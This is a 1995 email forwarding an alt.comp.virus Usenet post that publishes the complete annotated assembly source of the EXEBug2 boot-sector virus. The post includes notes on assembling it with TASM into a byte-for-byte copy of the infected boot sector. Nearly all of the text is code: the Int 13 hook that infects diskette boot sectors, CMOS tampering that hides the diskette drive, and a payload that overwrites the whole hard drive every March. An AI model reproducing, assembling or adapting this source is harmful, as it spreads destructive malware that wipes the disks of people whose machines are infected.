From smtp Tue Feb  7 13:18 EST 1995
Received: from lynx.dac.neu.edu by POBOX.jwu.edu; Tue,  7 Feb 95 13:18 EST
Received: by lynx.dac.neu.edu (8.6.9/8.6.9) 
     id NAA25457 for joshuaw@pobox.jwu.edu; Tue, 7 Feb 1995 13:20:39 -0500
Date: Tue, 7 Feb 1995 13:20:39 -0500
From: lynx.dac.neu.edu!ekilby (Eric Kilby)
Content-Length: 44201
Content-Type: binary
Message-Id: <199502071820.NAA25457@lynx.dac.neu.edu>
To: pobox.jwu.edu!joshuaw 
Subject: (fwd) EXEBug
Newsgroups: alt.comp.virus
Status: O

Path: chaos.dac.neu.edu!usenet.eel.ufl.edu!news.bluesky.net!news.sprintlink.net!uunet!ankh.iia.org!danishm
From: danishm@iia.org ()
Newsgroups: alt.comp.virus
Subject: EXEBug
Date: 5 Feb 1995 22:08:52 GMT
Organization: International Internet Association.
Lines: 641
Message-ID: <3h3i9k$v4@ankh.iia.org>
NNTP-Posting-Host: iia.org
X-Newsreader: TIN [version 1.2 PL2]

Here is the EXEBug virus:

;-------------------------------------------------------------------------
.286p                                   ; The EXEBUG2 Virus.  This virus
.model tiny                             ; infects diskette boot sectors and
.code                                   ; activates in March of any year,
                                        ; destroying the hard drive.  It
        ORG     0100h                   ; contains instructions for 80286+
                                        ; processors.
;---------------------------------------;---------------------------------
; As of Apr 21st, this disassembly is   ; Disassembled with Master Core
; incomplete, as the test computer uses ;  Disassembler: IQ Software
; Disk Manager and can not be infected. ; Analyzed with Quaid Analyzer:
;                                       ;  Quaid Software Ltd.
;-------------------------------------------------------------------------
; We are using an origin of 100h, so that this can be assembled with TASM
; and linked with tlink /t.  You will have a 512 byte .COM file which is
; a byte-for-byte duplicate of the original boot sector. Note that 100h
; must be subtracted from many of the offsets.
;-------------------------------------------------------------------------
                                        ;Offset Opcode  |Comment
                                        ;---------------------------------
Boot_Start:                             ;00100  EB1C
                                        ;---------------------------------
        JMP     Short Change_RAM        ; Boot sectors always begin with
                                        ; a long jump (E9 XX XX) or a short
                                        ; jump (EB XX 90)
                                        ;---------------------------------
        NOP                             ;00102  90      |NOP for short jump
;---------------------------------------;               |
; Data in Code Area                     ;               |
;---------------------------------------;               |
OEM     DB      "MSDOS5.0"              ;00103  4D53444F|OEM name
Byt_Sec DW      0200h                   ;0010B  0002    |Bytes per sector
Sct_AlU DB      02h                     ;0010D  02      |Sectors per
                                        ;               | allocation unit
RsvdSct DW      0001h                   ;0010E  0100    |Reserved sectors
NumFATs DB      02h                     ;00110  02      |Number of FATs
RootSiz DW      0070h                   ;00111  7000    |Number of root dir
                                        ;               | entries (112)
TotSect DW      02D0h                   ;00113  D002    |Total sectors in
                                        ;               | volume (1440)
MedDesc DB      0FDh                    ;00115  FD      |Media descriptor
                                        ;               | byte:
                                        ;---------------------------------
                                        ;  F8 = hard disk
                                        ;  F0 = 3«" 18 sector
                                        ;  F9 = 3«"  9 sector
                                        ;  F9 = 5¬" 15 sector
                                        ;  FC = 5¬" SS 9 sector
                                        ;  FD = 5¬" DS 9 sector
                                        ;  FE = 5¬" SS 8 sector
                                        ;  FF = 5¬: DS 8 sector
                                        ;---------------------------------
FATSect DW      0002h                   ;00116  0200    |Sectors per FAT
Sct_Trk DW      0009h                   ;00118  0900    |Sectors per track
NumHead DW      0002h                   ;0011A  0200    |Number of heads
aDrvNum DW      0000h                   ;0011C  0000    |Drive number (0=A:)
;---------------------------------------;---------------------------------
                                        ;               |
Change_RAM:                             ;               |
                                        ;               |
        XOR     AX,AX                   ;0011E  33C0    |Zero register
        MOV     DS,AX                   ;00120  8ED8    |DS = 0000
        MOV     DI,AX                   ;00122  8BF8    |DI = 0000
        MOV     SS,AX                   ;00124  8ED0    |SS = 0000
        MOV     SP,7C00h                ;00126  BC007C  |SP = 7C00
                                        ;---------------------------------
                                        ; Get RAM size (usually 64*10 K)
                                        ; and put it in register AX.
Get_RAM_Size:                           ;---------------------------------
                                        ;               |
        MOV     AX,Word Ptr DS:[0413h]  ;00129  A11304  |0000:0413 holds
                                        ;               | RAM size
        MOV     CX,0106h                ;0012C  B90601  |This does two things:
                                        ;               |it sets up a MOVSW,
                                        ;               |and it puts a 6 in
                                        ;               |CL for the SAL,CL
        DEC     AX                      ;0012F  48      |Steal 1K of RAM
                                        ;               | (decrease RAM size)
        MOV     SI,SP                   ;00130  8BF4    |SI is 7C00. Use to
                                        ;               | move boot sector
                                        ;               | in Copy_Boot routine.
                                        ;---------------------------------
                                        ; RAM size is now 1K less; put it
                                        ; in DS:0413h (RAMsize)
Put_RAM_Size:                           ;---------------------------------
                                        ;               |
        MOV     Word Ptr DS:[0413h],AX  ;00132  A31304  |Put the new RAM
                                        ;               | size back in [0413]
        SAL     AX,CL                   ;00135  D3E0    |Convert to paragraphs
;-------------------------------------------------------------------------
; AX now holds the SEGMENT of the new Int 13 service routine at TOM - 1K.
; Next operation exchanges this with the old Int 13 segment stored at 0000:004E.
;-------------------------------------------------------------------------
                                        ;               |
        MOV     ES,AX                   ;00137  8EC0    |ES = new area SEGMENT
        PUSH    AX                      ;00139  50      |Save SEGMENT address
                                        ;               | on stack. Jump here
                                        ;               | at offset 0152.
        XCHG    AX,DS:[004Eh]           ;0013A  87064E00|Exchange new and old
                                        ;               | SEGMENTS
                                        ;---------------------------------

        MOV     Word Ptr DS:[7C00h+offset I13_Seg - 100h],AX

                                        ;---------------------------------
                                        ;0013E  A3B87C  |This really should be:
                                        ;               |[7C00h+offset I13_Seg],
                                        ;               |but we use an ORG of
                                        ;               |100h here.
                                        ;      <Store old SEGMENT at 7CB8>
                                        ;---------------------------------

        MOV     AX,offset New_Int13_ISR - 100h

                                        ;---------------------------------
                                        ;00141  B83201  |Likewise the offset
                                        ;               |of the new Int 13
                                        ;               |service routine is
                                        ;               |decremented by 100h
;------------------------------------------------------------------------
; AX now holds the OFFSET of the new Int 13 service routine, which is
; in our code at offset 232h.  Next operation exchanges this with the
; the offset stored at 0000:004C.
;------------------------------------------------------------------------
                                        ;               |
        XCHG    AX,DS:[004Ch]           ;00144  87064C00|Exchange new and old
                                        ;               | OFFSETS
                                        ;---------------------------------

        MOV     Word Ptr DS:[7C00h+offset I13_Off - 100h],AX

                                        ;---------------------------------
                                        ;00148  A3B67C  |Again, decrement by
                                        ;               | 100h to compensate
                                        ;               | for ORG 100h
                                        ;      <Store old OFFSET at 7CB6>
                                        ;---------------------------------

        MOV     AX,[offset Activation - 100h]

                                        ;---------------------------------
                                        ;0014B  B89900  |Move offset of
                                        ;               |Activation routine
                                        ;               |to AX.
        PUSH    AX                      ;0014E  50      |Push the Activation
                                        ;               |address, and then
                                        ;               |use that as the
                                        ;               |OFFSET when we RETF
                                        ;               |at offset 0152.
Copy_Boot:                              ;---------------------------------
                                        ;               |
        CLD                             ;0014F  FC      |movsb will increment
                                        ;               |pointers cx=0106h
                                        ;               |ds=0000h sp=7C00h
                                        ;               |si=7C00h di=0000h
                                        ;               |Repeat until Zero
                                        ;               |Flag=0 or CX Times
                                        ;               |
        REP     MOVSW                   ;00150  F3A5    |MOVE DS:SI TO ES:DI
                                        ;---------------------------------
                                        ; Move virus up to the memory we have
                                        ; allocated, and set the INT handler.
                                        ;---------------------------------
                                        ;               |
        RETF                            ;00152  CB      |The segment and
                                        ;               |offset of the
                                        ;               |Activation routine
                                        ;               |were pushed on the
                                        ;               |stack previously, so
                                        ;               |a RETF jumps there
                                        ;               |(at top of memory)
                                        ;>>>>>>>>>>>>>>>|JUMP TO ACTIVATION
;---------------------------------------;---------------------------------
                                        ;               |
        DB      04h                     ;00153  04      |
Drive   DB      20h                     ;00154  20      |CMOS drive type (AH),
                                        ;               | is stored here.
ChkSum  DW      046Ch                   ;00155  6C04    |CMOS checksum (DX),
                                        ;               | is stored here.
Install DB      01h                     ;00157  01      |This byte is checked
                                        ;               | at offset 294. It is
                                        ;               | used for the value
                                        ;               | of CX when the boot
                                        ;               | record is written
                                        ;               | (starting sector)
                                        ;               | Values are 1 or 11h.
;-------------------------------------------------------------------------
; The code (or is it data?) below from offsets 0158 to 0198 is not analyzed,
; as I could not get an infection on the test computer.
;-------------------------------------------------------------------------
        SUB     [BX+SI],CH              ;00158  2828    |
        ADD     [BX+DI],AL              ;0015A  0001    |
        ADD     AL,[BP+1Eh]             ;0015C  02461E
                                        ;  ADD AL,[BP+offset Change_RAM-100h]
        PUSH    CX                      ;0015F  51      |
        MOV     DL,65h                  ;00160  B265    |
        MOV     DI,DX                   ;00162  8BFA    |
        DEC     AL                      ;00164  FEC8    |
        STOSW                           ;00166  AB      |STORE Word STRING
                                        ;               | FROM AX
        ADD     DI,+04h                 ;00167  83C704  |
        XOR     AL,0C0h                 ;0016A  34C0    |
        STOSW                           ;0016C  AB      |
        MOV     CL,0Bh                  ;0016D  B10B    |cl=0Bh dl=65h
        REP     STOSB                   ;0016F  F3AA    |STORE 0Bh Bytes
                                        ;               | STRING FROM AL
        MOV     CL,13h                  ;00171  B113    |
        MOV     BH,03h                  ;00173  B703    |
        CALL    $-170h                  ;00175  E88DFE  |This calls offset
                                        ;               |7B05 in this segment.
        MOV     AH,13h                  ;00178  B413    |
        INT     2Fh                     ;0017A  CD2F    |Get & set DOS disk
                                        ;               |int handler
                                        ;               |ds:dx=new handler,
                                        ;               |es:bx=old
        MOV     CS:[01B8h],DS           ;0017C  2E8C1E  |
                                        ;       B801    |
                                        ;               |
        MOV     CX,DX                   ;00181  8BCA    |
        INT     2Fh                     ;00183  CD2F    |Set it again
        MOV     DS:[01B6h],CX           ;00185  890EB601|
        CMP     CL,32h                  ;00189  80F932  |
        JZ      H0000_0198              ;0018C  740A    |Return if CL=32h
        MOV     CX,CS                   ;0018E  8CC9    |
        ADD     CX,+10h                 ;00190  83C110  |
        PUSH    CX                      ;00193  51      |
        MOV     AX,00FDh                ;00194  B8FD00  |
        PUSH    AX                      ;00197  50      |
                                        ;               |
H0000_0198:                             ;---------------------------------
                                        ;               |
        RETF                            ;00198  CB      |
;---------------------------------------;---------------------------------
                                        ;               |
Activation:                             ;               |
                                        ;               |
        CALL    Main_Routine            ;00199  E86800  |
        MOV     AH,04h                  ;0019C  B404    |AH=4 (get date)
        INT     1Ah                     ;0019E  CD1A    |Get date
                                        ;               |CX=year, DX=mon/day
        CMP     DH,03h                  ;001A0  80FE03  |Is it month #3
        JZ      Damage                  ;001A3  7402    |If it is March,
                                        ;               | do damage
        INT     19h                     ;001A5  CD19    |Otherwise reboot
                                        ;               | with virus resident
                                        ;               | and Int 13 hooked
;---------------------------------------;---------------------------------
                                        ; Set up Int 13 call from the new
Damage:                                 ;  ISR at I13_Seg:I13_Off.
                                        ;---------------------------------
        MOV     AL,0FFh                 ;001A7  B0FF    |
        OUT     21h,AL                  ;001A9  E621    |Turn off IRQs
        MOV     DX,0080h                ;001AB  BA8000  |DH = head # (0),
                                        ;               |DL = drive #
                                        ;               |  (+80 for hd)
        MOV     CX,0101h                ;001AE  B90101  |CH = cylinder #,
                                        ;               |CL = sector #
Trash_HardDrive:                        ;---------------------------------
                                        ;               |
        MOV     AX,0311h                ;001B1  B81103  |AH = function 03
                                        ;               | (write sectors)
                                        ;               |AL = # of sectors
        PUSHF                           ;001B4  9C      |Push flags: normally
                                        ;               | done prior to
                                        ;               | interrupt.
FarCall DB      9Ah                     ;001B5  9A      |Call the Int 13
                                        ;               | service routine
I13_Off DW      0AB1Bh                  ;001B6  1BAB    |(real) Int 13 offset
I13_Seg DW      0F000h                  ;001B8  00F0    |(real) Int 13 segment
        INC     DH                      ;001BA  FEC6    |Next head
        AND     DH,07h                  ;001BC  80E607  |Test bits 0-3 of DH,
                                        ;               | clear 4-7
        JNZ     Trash_HardDrive         ;001BF  75F0    |If #head > 7
                                        ;               |continue, else trash
        INC     CH                      ;001C1  FEC5    |Next cylinder
        JNZ     Trash_HardDrive         ;001C3  75EC    |If #cylinder > 255
                                        ;               | continue, else keep
                                        ;               | on trashing.
        ADD     CL,40h                  ;001C5  80C140  |Set bits 6 and 7 of
                                        ;               | CL, enabling the
                                        ;               | entire drive to be
                                        ;               | overwritten (or at
                                        ;               |least 1024 cylinders)
        JMP     Short Trash_HardDrive   ;001C8  EBE7    |Only way out of this
                                        ;               | is a disk error, or
                                        ;               | power off.
;--------------------------------------------------------------------------
                                        ;At this point, it is important to
Change_CMOS:                            ;know what the contents of DX is.
                                        ; CMOS checksums are stored at
                                        ; DS:0053 and DS:0055
;--------------------------------------------------------------------------
        MOV     AL,10h                  ;001CA  B010    |Diskette type
        CALL    CMOS_Read_Write         ;001CC  E80700  | SET DISKETTE TYPE
        MOV     AL,2Fh                  ;001CF  B02F    |Hi checksum byte
        CALL    CMOS_Read_Write         ;001D1  E80200  | SET CHECKSUM: set
                                        ;               | to zero or restore
        MOV     AL,2Eh                  ;001D4  B02E    |Low checksum byte
                                        ;               | SET CHECKSUM: set
                                        ;               | to zero or restore
CMOS_Read_Write:                        ;---------------------------------
                                        ;               |
        OUT     70h,AL                  ;001D6  E670    |Tell CMOS address
                                        ;               |  to read (in AL)
        XCHG    AH,DL                   ;001D8  86E2    |1st call: AH=DL=00
                                        ;               |2nd call: AH=DL=00
                                        ;               |3rd call: AH=20,DL=00
                                        ;               |4th call: AH=5F,DL=00
                                        ;               |5th call: AH=02,DL=5F
                                        ;               |6th call: AH=00,DL=02
                                        ;               |
        XCHG    DL,DH                   ;001DA  86D6    |1st call: DH=DL=00
                                        ;               |2nd call: DH=00,DL=20
                                        ;               |3rd call: DH=00,DL=7F
                                        ;               |4th call: DH=00,DL=02
                                        ;               |5th call: DH=5F,DL=00
                                        ;               |6th call: DH=02,DL=00
                                        ;               |
        IN      AL,71h                  ;001DC  E471    |Read CMOS to AL
                                        ;               |1st call: AL=20
                                        ;               |2nd call: AL=7F
                                        ;               |3rd call: AL=02
                                        ;               |4th call: AL=00
                                        ;               |5th call: AL=00
                                        ;               |6th call: AL=00
                                        ;               |
        XCHG    DH,AL                   ;001DE  86F0    |Trade AL <-> DH
                                        ;               |1st call: DH=20,AL=00
                                        ;               |2nd call: DH=7F,AL=00
                                        ;               |3rd call: DH=02,AL=00
                                        ;               |4th call: DH=00,AL=00
                                        ;               |5th call: DH=00,AL=5F
                                        ;               |6th call: DH=00,AL=02
                                        ;               |
        OUT     71h,AL                  ;001E0  E671    |Write contents of
                                        ;               |  AL to CMOS
                                        ;               |1st call: AL=00
                                        ;               |2nd call: AL=00
                                        ;               |3rd call: AL=00
                                        ;               |4th call: AL=00
                                        ;               |5th call: AL=5F
                                        ;               |6th call: AL=02
                                        ;               |
        RET                             ;001E2  C3      |Return to Call_CMOS
;---------------------------------------;---------------------------------
                                        ;               |
Setup_Int13:                            ;               |
                                        ;               |
        MOV     AX,0301h                ;001E3  B80103  |Function #3: write
                                        ;               |  (1) sector
Real_Int13_2:                           ;---------------------------------
                                        ;               |
        CALL    Restore_CMOS            ;001E6  E80500  |Restore original CMOS
        PUSHF                           ;001E9  9C      |Prepare for interrupt
                                        ;---------------------------------
                                                        ;DO THE INTERRUPT 13
        CALL    DWord Ptr DS:[I13_Off-100h]             ;Subtract 100h from
                                                        ; offset of old Int 13
                                        ;001EA  FF1EB600| vector and then call
                                        ;               | it as a DWord (i.e.
                                        ;               | as Segment:Offset)
                                        ;               | Standard Int 13
                                        ;               | resets and repeats
                                        ;               | 3 times if carry
                                        ;               | flag not clear.
Restore_CMOS:                           ;---------------------------------
                                        ;               |
        CALL    Xchg_Old_New            ;001EE  E80300  |
        CALL    Change_CMOS             ;001F1  E8D6FF  |
                                        ;               |
Xchg_Old_New:                           ;---------------------------------
                                        ;               |
        XCHG    AX,DS:[0053h]           ;001F4  87065300|
        XCHG    DX,DS:[0055h]           ;001F8  87165500|
        RET                             ;001FC  C3      |
;---------------------------------------;---------------------------------
                                        ;               |
Jump_From_Boot:                         ;               |
                                        ;               |
        CALL    Main_Routine            ;001FD  E80400  |
                                        ; CALL 0204h    |
                                        ;               |
        CALL    Restore_CMOS            ;00200  E8EBFF  |Call 01EEh
        ;-------------------------------;---------------------------------
        ;RETF                           ;               |This must be assembled
                                        ;               |as DB 0CBh, otherwise
        DB      0CBh                    ;00203  CB      |the assembler emits
                                        ;               |CA CB 00.
;---------------------------------------;---------------------------------
                                        ;               |Diddle CMOS. Read
Main_Routine:                           ;00204          |boot with new Int13.
                                        ;               |
;-------------------------------------------------------------------------
;                                                       |
; (64 Bytes)    FFEEDDCC BBAA9988 77665544 33221100     |This is the original
;               -------- -------- -------- --------     |CMOS setting.
; CMOS IS NOW:  00008050 02269303 28000016 00200027     |
;               00000000 0000310D 80028003 00F00020  <--|diskette drive(s) type
; Checksum -->  7F021A04 01000009 04000000 00000000     |Bits 7-4: drive 0
;  is 7F02      00000001 01000000 00000000 80190D80     |Bits 3-0: drive 1
;                                                       |  0000b = no drive
;                                                       |  0001b = 360K
;                                                       |  0010b = 1.2 MB
;                                                       |  0011b = 720K
;                                                       |  0100b = 1.44 MB
;                                                       |so in this case there
;                                                       |is one 1.2 meg drive
;                                                       |and no 'B' drive
;-------------------------------------------------------------------------
                                        ;               |Put address of
CMOS_0:                                 ;               | hidden memory on
        PUSH    CS                      ;00204  0E      | stack and then pop
        POP     DS                      ;00205  1F      | it into DS.
        MOV     ES,CX                   ;00206  8EC1    |Zero ES
        CALL    Change_CMOS             ;00208  E8BFFF  |AX=0099,DX=0000
;-------------------------------------------------------------------------
;
; CMOS CHANGED: 00008050 02269303 28000017 00420002
;               00000000 0000310D 80028003 00F00000 <-NOTE CHANGE
; NOTE CHANGE-> 00001A04 01000009 04000000 00000000    No drive
;  No checksum  00000001 01000000 00000000 80190D80
;
;-------------------------------------------------------------------------
                                        ;               |Now the drive type
CMOS_1:                                 ;               | and checksum are 00
        MOV     AL,AH                   ;0020B  8AC4    |AX=2020
        AND     AL,0F0h                 ;0020D  24F0    |AX=2020
        JZ      Calc_ChkSum             ;0020F  7408    |Is zero flag set?
        MOV     DS:[0055h],DX           ;00211  89165500|Store checksum in
                                        ;               | DS:[0055]
        MOV     DS:[0054h],AH           ;00215  88265400|Store drive type
                                        ;               | in DS:[0054]
Calc_ChkSum:                            ;---------------------------------
                                        ;               |
        AND     AH,0Fh                  ;00219  80E40F  |Clears high bits
                                        ;               | AX=0020
        SUB     DL,AL                   ;0021C  2AD0    |DX=025F
        SBB     DH,00h                  ;0021E  80DE00  |DX=025F
        CALL    Change_CMOS             ;00221  E8A6FF  |AX=0020, DX=025F
;-------------------------------------------------------------------------
;
; CMOS CHANGED: 00008050 02269303 28000018 00030041
;               00000000 0000310D 80028003 00F00000
; NOTE CHANGE-> 5F021A04 01000009 04000000 00000000
;               00000001 01000000 00000000 80190D80
;
;-------------------------------------------------------------------------
                                        ;               |
CMOS_2:                                 ;               |
        MOV     DL,80h                  ;00224  B280    | DL = 80
                                        ;               |
Read_Boot:                              ;---------------------------------
                                        ;               |
        MOV     CX,0001h                ;00226  B90100  | CX = 0001
        MOV     DH,CH                   ;00229  8AF5    | DH = 00
        POP     AX                      ;0022B  58      | Pop return offset
        PUSHF                           ;0022C  9C      | Push flags
        PUSH    CS                      ;0022D  0E      | Save segment
        PUSH    AX                      ;0022E  50      | Save offset
        MOV     AX,0201h                ;0022F  B80102  | AX = 0201 (read
                                        ;               |      one sector)
                                        ;
New_Int13_ISR:                          ;___ New Int 13 Service Routine ___
                                        ;
        CLD                             ;00232  FC      |Clear direction flag
        PUSH    DS                      ;00233  1E      |
        PUSH    SI                      ;00234  56      |
        PUSH    DI                      ;00235  57      |Save some registers
        PUSH    CX                      ;00236  51      |
        PUSH    AX                      ;00237  50      |
        PUSH    CS                      ;00238  0E      |
        POP     DS                      ;00239  1F      |DS = CS
        CMP     AH,03h                  ;0023A  80FC03  |Is it a function 3
                                        ;               | (write disk) call?
        JNZ     Real_Int13_1            ;0023D  7521    |No, so do real Int 13
        CMP     Byte Ptr ES:[BX],4Dh    ;0023F  26803F4D|Yes, but is ES:[BX]=4D?
        JNZ     Real_Int13_1            ;00243  751B    |No, so do real Int13
        OR      AH,DL                   ;00245  0AE2    |Yes, but which drive?
        CMP     CL,AH                   ;00247  3ACC    |Is drive OK??
        JNZ     Real_Int13_1            ;00249  7515    |No, so do real Int13
        MOV     DI,BX                   ;0024B  8BFB    |Yes, buffer is [4D]
        MOV     SI,00A7h                ;0024D  BEA700  |
        MOV     CX,01FEh                ;00250  B9FE01  |Going to move 1FE words
        AND     DL,DL                   ;00253  22D2    |Is it drive #0 (A:)?
        JNZ     H0000_025E              ;00255  7507    |No, so move 'em
        MOV     SI,0002h                ;00257  BE0200  |Yes, SI = 0002
        MOV     AX,5CEBh                ;0025A  B8EB5C  |Move value in AX
        STOSW                           ;0025D  AB      | to ES:[4D]
                                        ;               |
H0000_025E:                             ;---------------------------------
                                        ;               |cx=01FEh,ds=0000h
                                        ;               |si=0002h Move 1FE
        REP     MOVSB                   ;               | words from DS:SI
                                        ;0025E  F3A4    | to ES:DI
Real_Int13_1:                           ;---------------------------------
                                        ;               |
        POP     AX                      ;00260  58      |Restore registers
        POP     CX                      ;00261  59      |
        POP     DI                      ;00262  5F      |
        MOV     SI,AX                   ;00263  8BF0    |SI=function,subfn
        CALL    Real_Int13_2            ;00265  E87EFF  |When done go to
                                        ;               | Return_here.
Return_Here:                            ;---------------------------------
                                        ;               |
        JB      Int13_Error             ;00268  721D    |If Int 13 returned
                                        ;               | error go to err rtn
        PUSH    DI                      ;0026A  57      |Save registers
        PUSH    AX                      ;0026B  50      |
        OR      DH,DH                   ;0026C  0AF6    |Was drive A: target?
        JNZ     Exit_Virus              ;0026E  7514    |Yes, Exit_Virus
        CMP     CX,+01h                 ;00270  83F901  |Was it a 1 sector
                                        ;               | operation?
        JNZ     Exit_Virus              ;00273  750F    |No, Exit_Virus
        MOV     AX,SI                   ;00275  8BC6    |Restore Int 13
                                        ;               | function, sub fn
        CMP     AH,02h                  ;00277  80FC02  |Was it a read fn?
        JZ      Int13_Read              ;0027A  7410    |
        CMP     AH,03h                  ;0027C  80FC03  |
        JNZ     Exit_Virus              ;0027F  7503    |
                                        ;               |
Read_New_Boot:                          ;---------------------------------
                                        ;               |This pushes the
        CALL    Read_Boot               ;00281  E8A2FF  | address of
                                        ;               | Read_Boot on stack
Exit_Virus:                             ;---------------------------------
                                        ;               |
        CLC                             ;00284  F8      |
        POP     AX                      ;00285  58      |Restore registers
        POP     DI                      ;00286  5F      |
                                        ;               |
Int13_Error:                            ;---------------------------------
                                        ;               |
        POP     SI                      ;00287  5E      |
        POP     DS                      ;00288  1F      |
        RETF    0002h                   ;00289  CA0200  |Return to address
                                        ;               | on stack. Discard
                                        ;               | next two bytes on
                                        ;               | stack. This
                                        ;               | eventually gets us
                                        ;               | to offset 19C (check
                                        ;               | activation & reboot)
;---------------------------------------;---------------------------------
Int13_Read:                             ;               |
                                        ;               |
        PUSH    CX                      ;0028C  51      |Push # sectors
        CMP     Byte Ptr ES:[BX+28h],7Ch;0028D  26807F  |Compare [0000:7C28]
                                        ;       287C    | with 7C. (Boot
                                        ;               | record offset 28).
        JNZ     Boot_Changed            ;00292  750D    |If no, then the
                                        ;               | boot record changed.
                                        ;00294  268B8F  |MOV CX,ES:[BX+0057h]
                                        ;       5700    |
                                                        ;
        MOV     CX,ES:[BX + word ptr Install - 100h]    ;Move starting sector
                                                        ; to CX
        MOV     AL,01h                  ;00299  B001    |
        CALL    Real_Int13_2            ;0029B  E848FF  |
                                        ;               |
HD_Exit:                                ;---------------------------------
                                        ;               |
        POP     CX                      ;0029E  59      |
        JMP     Short Exit_Virus        ;0029F  EBE3    |
;---------------------------------------;---------------------------------
Boot_Changed:                           ;               |
                                        ;               |
        PUSH    DX                      ;002A1  52      |Save drive info
        MOV     CL,11h                  ;002A2  B111    |CX=0011 (Changed)
        TEST    DL,80h                  ;002A4  F6C280  |Is it a hard drive?
        JNZ     Hard_Drive              ;002A7  7534    |Yes, goto Hard_Drive
        MOV     CH,28h                  ;002A9  B528    |
        CMP    Byte Ptr ES:[BX+15h],0FCh;002AB  26807F  |
                                        ;       15FC    |
        JNB     H0000_02B4              ;002B0  7302    |
        SAL     CH,1                    ;002B2  D0E5    |
                                        ;               |
H0000_02B4:                             ;---------------------------------
                                        ;               | This code not
        PUSH    ES                      ;002B4  06      | analyzed as of
        PUSH    BX                      ;002B5  53      | April 21st.
        XOR     AX,AX                   ;002B6  33C0    |
        MOV     ES,AX                   ;002B8  8EC0    |
        LES     BX,DWord Ptr ES:[0078h] ;002BA  26C41E  |
                                        ;       7800    |
                                        ;               |Load ES & operand
                                        ;               | from memory
        PUSH    ES                      ;002BF  06      |
        PUSH    BX                      ;002C0  53      |
        INC     AL                      ;002C1  FEC0    |
        MOV     CL,AL                   ;002C3  8AC8    |
        XCHG    CL,ES:[BX+04h]          ;002C5  26864F04|
        MOV     AH,05h                  ;002C9  B405    |
        MOV     BX,0059h                ;002CB  BB5900  |
        MOV     [BX],CH                 ;002CE  882F    |
        PUSH    CS                      ;002D0  0E      |
        POP     ES                      ;002D1  07      |
        CALL    Real_Int13_2            ;002D2  E811FF  |
        POP     BX                      ;002D5  5B      |
        POP     ES                      ;002D6  07      |
        XCHG    CL,ES:[BX+04h]          ;002D7  26864F04|
        POP     BX                      ;002DB  5B      |
        POP     ES                      ;002DC  07      |
                                        ;               |
Hard_Drive:                             ;---------------------------------
                                        ;               |
        CALL    Setup_Int13             ;002DD  E803FF  |Prepare for Write
        POP     DX                      ;002E0  5A      |Get drive info
        JB      HD_Exit                 ;002E1  72BB    |On error exit
        MOV     DS:[0057h],CX           ;002E3  890E5700|DS:[57]=11 (Changed)
        MOV     Word Ptr ES:[BX],1CEBh  ;002E7  26C707  |[0000:7C00] now holds
                                        ;       EB1C    | EB 1C.
        MOV     SI,001Eh                ;002EC  BE1E00  |SI=001E
        ;-------------------------------;---------------------------------
        ;LEA     DI,[BX+001Eh]          ;               |TASM will emit 8D7F1E
                                        ;               |for this instruction,
        DB      8Dh,0BFh,1Eh,00h        ;002EF  8DBF1E00|so assemble as DB's
                                        ;               |BX=7C00 SI=001E
                                        ;               |ES=0000 DI=7C1E
        ;-------------------------------;---------------------------------
        MOV     CX,01E0h                ;002F3  B9E001  |cx=01E0h si=001Eh
        REP     MOVSB                   ;002F6  F3A4    |Move DS:SI to ES:DI
                                        ;               |Restore boot record
                                        ;               | from ofs 7C00:001E
                                        ;               | Note initial jump
                                        ;               | restored to EB 1C.
        POP     CX                      ;002F8  59      |CX=number of sectors
        CALL    Setup_Int13             ;002F9  E8E7FE  |Write the new boot
                                        ;               | record.
        JMP     Short Read_New_Boot     ;002FC  EB83    |Read it and process.
;---------------------------------------;---------------------------------
Boot_ID DW      0AA55h                  ;002FE  55AA    |All valid boot
                                        ;               | sectors end with
                                        ;               | 55AA
        ENDS                            ;---------------------------------
                                        ; Disassembly by Arthur Ellis and ??
        END     Boot_Start              ; [Suggestions by Lucifer Messiah]
                                        ; April, 1993
;-------------------------------------------------------------------------



--
Eric "Mad Dog" Kilby                                 maddog@ccs.neu.edu
The Great Sporkeus Maximus			     ekilby@lynx.dac.neu.edu
Student at the Northeatstern University College of Computer Science 
"I Can't Believe It's Not Butter"

